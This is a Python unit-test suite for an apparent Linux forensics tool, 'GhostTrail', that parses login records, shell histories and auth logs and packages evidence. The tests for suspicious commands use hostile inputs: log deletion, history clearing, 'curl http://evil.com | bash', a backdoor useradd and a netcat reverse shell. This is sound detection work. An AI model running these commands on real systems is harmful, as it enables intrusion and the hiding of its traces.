import hashlib
import json
import os
import shutil
import struct
import sys
import tempfile
import time
import unittest
import zipfile
from datetime import datetime
from pathlib import Path
from unittest import mock

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(BASE_DIR, "src"))
sys.path.insert(0, BASE_DIR)

from binary_parser import GhostBinaryParser, UTMP_FORMAT, UTMP_SIZE
from file_tracker import GhostFileTracker
from history_parser import GhostHistoryParser
from gap_detector import GhostGapDetector
from evidence_collector import GhostEvidenceCollector
from ghosttrail import GhostTrail


def _pack_utmp(type_id, user=b"testuser", host=b"localhost", timestamp=None, pid=1234):
    ts = timestamp or int(time.time())
    return struct.pack(
        UTMP_FORMAT,
        type_id, pid,
        b"pts/0", b"p0",
        user, host,
        0, 0, 0, ts, 0,
        0, 0, 0, 0,
    )


# ── Binary Parser ─────────────────────────────────────────────────────────────

class TestGhostBinaryParser(unittest.TestCase):
    def setUp(self):
        self.parser = GhostBinaryParser()

    def test_missing_file_returns_error(self):
        result = self.parser.parse_wtmp("/nonexistent/wtmp")
        self.assertEqual(len(result), 1)
        self.assertIn("error", result[0])

    def test_user_process_included(self):
        data = _pack_utmp(7, user=b"alice", host=b"10.0.0.1")
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(data)
            path = f.name
        result = self.parser.parse_wtmp(path)
        os.unlink(path)
        self.assertEqual(len(result), 1)
        self.assertEqual(result[0]["user"], "alice")

    def test_boot_time_included(self):
        data = _pack_utmp(1, user=b"", host=b"")
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(data)
            path = f.name
        result = self.parser.parse_wtmp(path)
        os.unlink(path)
        self.assertEqual(len(result), 1)
        self.assertEqual(result[0]["type"], "BOOT_TIME")

    def test_non_login_type_excluded(self):
        data = _pack_utmp(6, user=b"someuser")
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(data)
            path = f.name
        result = self.parser.parse_wtmp(path)
        os.unlink(path)
        self.assertEqual(result, [])

    def test_host_decoded(self):
        data = _pack_utmp(7, host=b"192.168.1.99")
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(data)
            path = f.name
        result = self.parser.parse_wtmp(path)
        os.unlink(path)
        self.assertEqual(result[0]["host"], "192.168.1.99")

    def test_timestamp_decoded(self):
        ts = int(datetime(2026, 4, 25, 9, 0, 0).timestamp())
        data = _pack_utmp(7, timestamp=ts)
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(data)
            path = f.name
        result = self.parser.parse_wtmp(path)
        os.unlink(path)
        self.assertIn("2026-04-25", result[0]["timestamp"])

    def test_multiple_entries_returned(self):
        data = _pack_utmp(7, user=b"alice") + _pack_utmp(7, user=b"bob")
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(data)
            path = f.name
        result = self.parser.parse_wtmp(path)
        os.unlink(path)
        self.assertEqual(len(result), 2)


# ── File Tracker ──────────────────────────────────────────────────────────────

class TestGhostFileTracker(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.tracker = GhostFileTracker()
        self.tracker.sensitive_dirs = [self.tmp]

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _touch(self, name, content=b"x"):
        path = os.path.join(self.tmp, name)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        Path(path).write_bytes(content)
        return path

    def test_recent_file_detected(self):
        self._touch("newfile.txt")
        result = self.tracker.scan_recent_changes(hours=1)
        paths = [r["path"] for r in result]
        self.assertTrue(any("newfile.txt" in p for p in paths))

    def test_old_file_excluded(self):
        path = self._touch("oldfile.txt")
        old_time = time.time() - (48 * 3600)
        os.utime(path, (old_time, old_time))
        result = self.tracker.scan_recent_changes(hours=1)
        paths = [r["path"] for r in result]
        self.assertFalse(any("oldfile.txt" in p for p in paths))

    def test_hidden_file_flagged(self):
        self._touch(".secretfile")
        result = self.tracker.scan_recent_changes(hours=1)
        hidden = [r for r in result if r["is_hidden"]]
        self.assertTrue(any(".secretfile" in r["path"] for r in hidden))

    def test_non_hidden_file_not_flagged(self):
        self._touch("normalfile.txt")
        result = self.tracker.scan_recent_changes(hours=1)
        normal = [r for r in result if not r["is_hidden"] and "normalfile.txt" in r["path"]]
        self.assertTrue(len(normal) > 0)

    def test_noisy_cache_path_excluded(self):
        self._touch(".cache/browser/session.db")
        result = self.tracker.scan_recent_changes(hours=1)
        paths = [r["path"] for r in result]
        self.assertFalse(any(".cache" in p for p in paths))

    def test_result_has_required_fields(self):
        self._touch("check.txt")
        result = self.tracker.scan_recent_changes(hours=1)
        entry = next(r for r in result if "check.txt" in r["path"])
        for field in ("path", "modified", "size", "owner", "is_hidden"):
            self.assertIn(field, entry)


# ── History Parser ────────────────────────────────────────────────────────────

class TestGhostHistoryParser(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.parser = GhostHistoryParser()

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _mock_exists(self):
        _real = os.path.exists
        return mock.patch(
            "history_parser.os.path.exists",
            side_effect=lambda p: False if p == "/home" else _real(p),
        )

    def _scan(self, content, filename=".bash_history"):
        Path(os.path.join(self.tmp, filename)).write_text(content)
        with mock.patch("history_parser.os.path.expanduser", return_value=self.tmp), \
             self._mock_exists():
            return self.parser.scan_histories()

    def test_reads_commands(self):
        cmds = self._scan("ls -la\npwd\n")
        commands = [c["command"] for c in cmds]
        self.assertIn("ls -la", commands)
        self.assertIn("pwd", commands)

    def test_skips_comment_lines(self):
        cmds = self._scan("# this is a comment\nls\n")
        commands = [c["command"] for c in cmds]
        self.assertNotIn("# this is a comment", commands)
        self.assertIn("ls", commands)

    def test_skips_blank_lines(self):
        cmds = self._scan("ls\n\npwd\n")
        self.assertEqual(len(cmds), 2)

    def test_returns_user_field(self):
        cmds = self._scan("ls\n")
        self.assertEqual(cmds[0]["user"], os.path.basename(self.tmp))

    def test_returns_source_field(self):
        cmds = self._scan("ls\n", filename=".bash_history")
        self.assertEqual(cmds[0]["source"], ".bash_history")

    def test_empty_file_returns_no_commands(self):
        cmds = self._scan("")
        self.assertEqual(cmds, [])

    def test_zsh_history_read(self):
        cmds = self._scan("ls -la\n", filename=".zsh_history")
        self.assertEqual(len(cmds), 1)
        self.assertEqual(cmds[0]["source"], ".zsh_history")

    def test_get_history_paths_finds_file(self):
        hist = os.path.join(self.tmp, ".bash_history")
        Path(hist).write_text("ls\n")
        with mock.patch("history_parser.os.path.expanduser", return_value=self.tmp), \
             self._mock_exists():
            paths = self.parser.get_history_paths()
        self.assertIn(hist, paths)


# ── Gap Detector ──────────────────────────────────────────────────────────────

class TestGhostGapDetector(unittest.TestCase):
    def _make_log(self, content):
        f = tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".log")
        f.write(content)
        f.close()
        return f.name

    def test_missing_log_returns_error(self):
        detector = GhostGapDetector(log_path="/nonexistent/auth.log")
        result = detector.find_gaps()
        self.assertEqual(len(result), 1)
        self.assertIn("error", result[0])

    def test_no_gap_below_threshold(self):
        log = self._make_log(
            "Apr 25 09:00:00 host sshd[1]: msg\n"
            "Apr 25 09:30:00 host sshd[2]: msg\n"
        )
        gaps = GhostGapDetector(log_path=log).find_gaps(threshold_minutes=120)
        os.unlink(log)
        self.assertEqual(gaps, [])

    def test_gap_above_threshold_detected(self):
        log = self._make_log(
            "Apr 25 09:00:00 host sshd[1]: msg\n"
            "Apr 25 12:00:00 host sshd[2]: msg\n"
        )
        gaps = GhostGapDetector(log_path=log).find_gaps(threshold_minutes=120)
        os.unlink(log)
        self.assertEqual(len(gaps), 1)

    def test_gap_minutes_accurate(self):
        log = self._make_log(
            "Apr 25 09:00:00 host sshd[1]: msg\n"
            "Apr 25 12:00:00 host sshd[2]: msg\n"
        )
        gaps = GhostGapDetector(log_path=log).find_gaps(threshold_minutes=120)
        os.unlink(log)
        self.assertEqual(gaps[0]["gap_minutes"], 180)

    def test_iso_format_parsed(self):
        log = self._make_log(
            "2026-04-25T09:00:00+00:00 host sshd[1]: msg\n"
            "2026-04-25T12:00:00+00:00 host sshd[2]: msg\n"
        )
        gaps = GhostGapDetector(log_path=log).find_gaps(threshold_minutes=120)
        os.unlink(log)
        self.assertEqual(len(gaps), 1)
        self.assertEqual(gaps[0]["gap_minutes"], 180)

    def test_empty_log_returns_no_gaps(self):
        log = self._make_log("")
        gaps = GhostGapDetector(log_path=log).find_gaps()
        os.unlink(log)
        self.assertEqual(gaps, [])


# ── Evidence Collector ────────────────────────────────────────────────────────

class TestGhostEvidenceCollector(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.collector = GhostEvidenceCollector(output_dir=self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _make_artifact(self, content=b"evidence data"):
        f = tempfile.NamedTemporaryFile(delete=False)
        f.write(content)
        f.close()
        return f.name

    def test_creates_zip_file(self):
        artifact = self._make_artifact()
        self.collector.collect_artifacts([artifact])
        os.unlink(artifact)
        self.assertEqual(len(list(Path(self.tmp).glob("*.zip"))), 1)

    def test_zip_contains_manifest(self):
        artifact = self._make_artifact()
        zip_path = self.collector.collect_artifacts([artifact])
        os.unlink(artifact)
        with zipfile.ZipFile(zip_path) as zf:
            self.assertIn("manifest.json", zf.namelist())

    def test_manifest_has_correct_sha256(self):
        content = b"test content for hashing"
        expected = hashlib.sha256(content).hexdigest()
        artifact = self._make_artifact(content)
        zip_path = self.collector.collect_artifacts([artifact])
        os.unlink(artifact)
        with zipfile.ZipFile(zip_path) as zf:
            manifest = json.loads(zf.read("manifest.json"))
        self.assertEqual(manifest["files"][0]["sha256"], expected)

    def test_missing_artifact_skipped(self):
        zip_path = self.collector.collect_artifacts(["/nonexistent/file.txt"])
        with zipfile.ZipFile(zip_path) as zf:
            manifest = json.loads(zf.read("manifest.json"))
        self.assertEqual(manifest["files"], [])

    def test_manifest_has_case_id(self):
        artifact = self._make_artifact()
        zip_path = self.collector.collect_artifacts([artifact])
        os.unlink(artifact)
        with zipfile.ZipFile(zip_path) as zf:
            manifest = json.loads(zf.read("manifest.json"))
        self.assertIn("GT_EVIDENCE_", manifest["case_id"])


# ── Suspicious Pattern Detection ──────────────────────────────────────────────

class TestGhostTrailSuspicious(unittest.TestCase):
    def setUp(self):
        self.ghost = GhostTrail(base_output_dir=tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.ghost.base_output_dir, ignore_errors=True)

    def test_rm_log_flagged(self):
        self.assertTrue(self.ghost._is_suspicious("rm -rf /var/log/auth.log"))

    def test_history_clear_flagged(self):
        self.assertTrue(self.ghost._is_suspicious("history -c"))

    def test_curl_pipe_bash_flagged(self):
        self.assertTrue(self.ghost._is_suspicious("curl http://evil.com | bash"))

    def test_useradd_flagged(self):
        self.assertTrue(self.ghost._is_suspicious("useradd backdoor"))

    def test_netcat_reverse_shell_flagged(self):
        self.assertTrue(self.ghost._is_suspicious("nc -e /bin/bash 10.0.0.1 4444"))

    def test_safe_ls_command_clean(self):
        self.assertFalse(self.ghost._is_suspicious("ls -la"))

    def test_safe_git_command_clean(self):
        self.assertFalse(self.ghost._is_suspicious("git commit -m 'fix bug'"))

    def test_pattern_case_insensitive(self):
        self.assertTrue(self.ghost._is_suspicious("RM -RF /var/log/syslog"))


# ── Risk Grading ──────────────────────────────────────────────────────────────

class TestGhostTrailRiskGrade(unittest.TestCase):
    def setUp(self):
        self.ghost = GhostTrail(base_output_dir=tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.ghost.base_output_dir, ignore_errors=True)

    def _event(self, level, type_="ALERT"):
        return {"time": "2026-04-25 09:00:00", "type": type_, "msg": "test", "level": level}

    def test_empty_timeline_grade_a(self):
        grade, _, _ = self.ghost.calculate_risk([])
        self.assertEqual(grade, "A")

    def test_single_critical_grade_c(self):
        # score = 10: not > 10 (D), but > 5 (C)
        grade, _, _ = self.ghost.calculate_risk([self._event("CRITICAL")])
        self.assertEqual(grade, "C")

    def test_three_criticals_grade_f(self):
        grade, _, _ = self.ghost.calculate_risk([self._event("CRITICAL")] * 3)
        self.assertEqual(grade, "F")

    def test_single_warn_grade_b(self):
        # score = 3: > 0 (B)
        grade, _, _ = self.ghost.calculate_risk([self._event("WARN")])
        self.assertEqual(grade, "B")

    def test_stats_counted(self):
        events = [
            self._event("INFO", "LOGIN"),
            self._event("INFO", "FILE"),
            self._event("CRITICAL", "ALERT"),
        ]
        _, stats, _ = self.ghost.calculate_risk(events)
        self.assertEqual(stats["LOGIN"], 1)
        self.assertEqual(stats["FILE"], 1)
        self.assertEqual(stats["ALERT"], 1)

    def test_critical_findings_collected(self):
        _, _, findings = self.ghost.calculate_risk([self._event("CRITICAL")])
        self.assertIn("test", findings)


# ── Integration ───────────────────────────────────────────────────────────────

class TestGhostTrailIntegration(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.ghost = GhostTrail(base_output_dir=self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_no_recent_string_in_timeline(self):
        timeline, _ = self.ghost.generate_timeline(hours=1)
        self.assertNotIn("RECENT", [e["time"] for e in timeline])

    def test_timeline_sortable(self):
        timeline, _ = self.ghost.generate_timeline(hours=1)
        try:
            sorted(timeline, key=lambda x: x["time"])
        except TypeError:
            self.fail("Timeline sort raised TypeError — mixed time types present")

    def test_json_export(self):
        out = os.path.join(self.tmp, "report.json")
        self.ghost.run(hours=1, json_file=out)
        self.assertTrue(os.path.exists(out))
        with open(out) as f:
            data = json.load(f)
        for key in ("grade", "stats", "events"):
            self.assertIn(key, data)

    def test_html_export_contains_branding(self):
        out = os.path.join(self.tmp, "report.html")
        self.ghost.run(hours=1, html_file=out)
        self.assertTrue(os.path.exists(out))
        content = Path(out).read_text()
        self.assertIn("GHOST-TRAIL", content)
        self.assertIn("shadowfox.se", content)


if __name__ == "__main__":
    unittest.main()
